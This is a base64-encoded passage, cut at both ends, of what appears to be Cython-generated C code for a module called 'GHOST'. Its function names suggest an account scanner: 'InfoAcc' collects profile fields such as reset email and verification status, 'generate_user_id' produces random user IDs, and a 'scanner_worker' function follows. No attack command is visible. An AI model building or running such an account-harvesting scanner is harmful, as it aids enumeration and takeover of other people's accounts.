1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcblxuICAgIFxuICAgIF9fcHl4X3RfMjQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7XG4gICAgaWYgKF9fcHl4X3RfMjQpIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yMSwgJl9fcHl4X3RfMTcsICZfX3B5eF90XzE5KSA8IDApIF9fUFlYX0VSUigwLCAzNTUsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE3KTtcbiAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZSwgX19weXhfdF8xNyk7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzE4ID0gTlVMTDtcbiAgICAgICAgX19weXhfdF8zID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzE4LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X307XG4gICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMzU2LCBfX3B5eF9MNDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDQ4O1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0w0N19lcnJvcjo7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgIF9fcHl4X3RfMTAgPSAwOyBfX3B5eF90XzExID0gMDsgX19weXhfdF8xMiA9IDA7IF9fcHl4X3RfMzEgPSAwOyBfX3B5eF90XzMwID0gMDsgX19weXhfdF8yOSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzMxLCAmX19weXhfdF8zMCwgJl9fcHl4X3RfMjkpO1xuICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEwLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTIpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzEwLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTIpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMwKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjkpO1xuICAgICAgICAgIF9fcHl4X3RfMjQgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjMgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzMyID0gX19weXhfZmlsZW5hbWU7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzEpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMzApO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjkpO1xuICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMzEsIF9fcHl4X3RfMzAsIF9fcHl4X3RfMjkpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xMCwgX19weXhfdF8xMSwgX19weXhfdF8xMik7XG4gICAgICAgICAgX19weXhfdF8xMCA9IDA7IF9fcHl4X3RfMTEgPSAwOyBfX3B5eF90XzEyID0gMDsgX19weXhfdF8zMSA9IDA7IF9fcHl4X3RfMzAgPSAwOyBfX3B5eF90XzI5ID0gMDtcbiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzI0OyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMzsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzMyO1xuICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0w0ODo7XG4gICAgICB9XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcblxuICAgIFxuICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF80LCBfX3B5eF90XzUsIF9fcHl4X3RfNik7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MN190cnlfcmV0dXJuOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfdF82KTtcbiAgICBnb3RvIF9fcHl4X0wwO1xuICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfdF82KTtcbiAgICBfX3B5eF9MOF90cnlfZW5kOjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9ycik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9JZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mdWxsX25hbWUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm93cyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb3dnKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3BwKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2lzUHJhaXNlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Jpbyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9pc192ZXJpZmllZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNldF9lbWFpbCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9zcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9pbmxpbmVfa2V5Ym9hcmQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcGF5bG9hZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydHRfNUdIT1NUXzIzZ2VuZXJhdGVfdXNlcl9pZChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydHRfNUdIT1NUXzIzZ2VuZXJhdGVfdXNlcl9pZCA9IHsiZ2VuZXJhdGVfdXNlcl9pZCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnR0XzVHSE9TVF8yM2dlbmVyYXRlX3VzZXJfaWQsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMjNnZW5lcmF0ZV91c2VyX2lkKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXJhdGVfdXNlcl9pZCAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImdlbmVyYXRlX3VzZXJfaWQiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZ2VuZXJhdGVfdXNlcl9pZCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMzU4LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImdlbmVyYXRlX3VzZXJfaWQiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAzNTgsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuZ2VuZXJhdGVfdXNlcl9pZCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJ0dF81R0hPU1RfMjJnZW5lcmF0ZV91c2VyX2lkKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfMjJnZW5lcmF0ZV91c2VyX2lkKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikge1xuICBQeU9iamVjdCAqX19weXhfdl9zdGFydCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VuZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzU7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmVyYXRlX3VzZXJfaWQiLCAwKTtcblxuICBcbiAgX19weXhfdF8xID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI1MDAwMDAwMDA7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzIgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3Zfc3RhcnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzEpO1xuICBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X2VuZCA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMiA9IDA7XG5cbiAgXG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gIF9fcHl4X3RfMSA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICBfX3B5eF90XzUgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfMSk7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNSA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xLCBfX3B5eF92X3N0YXJ0LCBfX3B5eF92X2VuZH07XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2MCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIH1cbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzNjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3IgPSBfX3B5eF90XzQ7XG4gIF9fcHl4X3RfNCA9IDA7XG4gIGdvdG8gX19weXhfTDA7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmdlbmVyYXRlX3VzZXJfaWQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3N0YXJ0KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VuZCk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8yNXNjYW5uZXJfd29ya2VyKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0d